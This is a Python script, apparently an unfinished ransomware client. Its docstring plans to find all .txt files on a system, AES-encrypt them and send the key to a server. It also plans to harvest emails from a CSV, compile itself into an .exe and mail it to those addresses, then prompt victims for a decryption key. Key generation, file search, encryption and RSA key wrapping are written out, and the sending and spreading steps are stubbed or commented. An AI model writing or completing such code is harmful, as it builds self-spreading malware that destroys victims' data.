"""
how the pipeline works (when you run the client.exe file):
1. generate 16 character key [OK]
2. find all .txt files on the system [OK]
3. encrypt the files with the key using AES-CBC [Pending] <----------------
4. save the 16char key to a file on the desktop (Key.key) [OK]
5. generate RSA key pair [OK]
6. save the public/private key to a file on the desktop (keyPair.key) [OK]
7. encrypt the 16char key with the public key [OK] 
8. save the encrypted 16char to a file on the desktop (encryptedKey.key) [OK]
9. send the encrypted 16char key to the server [OK]
10. access the csv file and extract emails from it [OK]
11. convert the client.py to .exe file auto-py-to-exe library [Pending] <----------------
12. send the .exe file to the emails on the csv file [Pending] <----------------
13. when the .exe file is run, a prompt should popup indicating that the encryption is in progress [Pending] <----------------
14. After encrypting all txt files, the prompt will wait for a 
    key input in order to decrypt the files back. "Enter Key to decrypt" [Pending] <----------------
15. After the key is entered, the files will be decrypted and the prompt will close [Pending] <----------------
"""
# import functions from utils.py
from utils import *

#1
a=generate_key(16)

#2
findTxtFile()

#3
# here we need to encrypt the test files from the previous step, but for now we use a dummy file
#ascii_key = testEncryption()
file_path = r'file_paths.txt'

with open(file_path, 'r') as f:
        data = f.read()
encrypted_data = encrypt_data(a, data)


#4
saveKey(a, "Key.key")

#5
exported_public_key, exported_private_key =  generateRSAKeys()

#6
# I removed the \n from the key to make them fit 2 lines
key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
saveKey(key_pair, "keyPair.key")

#7
public_key = RSA.import_key(exported_public_key)
#convert ascii_key to bytes
byte_ascii_key = a.encode()
encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
with open('encrypted_file', 'wb') as f:
        f.write(encrypted_data)

#8
saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
d=decryptWithRSA(encoded_encrypted_msg.decode(), exported_private_key)
d2=decrypt_data(a, d)
with open("decr.txt", "a") as f:
                        f.write(d2 + "\n")

#9
#send_to_server(encoded_encrypted_msg)

#10
#emails = get_emails_from_csv()

#11 
# convert_to_exe()

#12
# send_to_emails(emails)

#13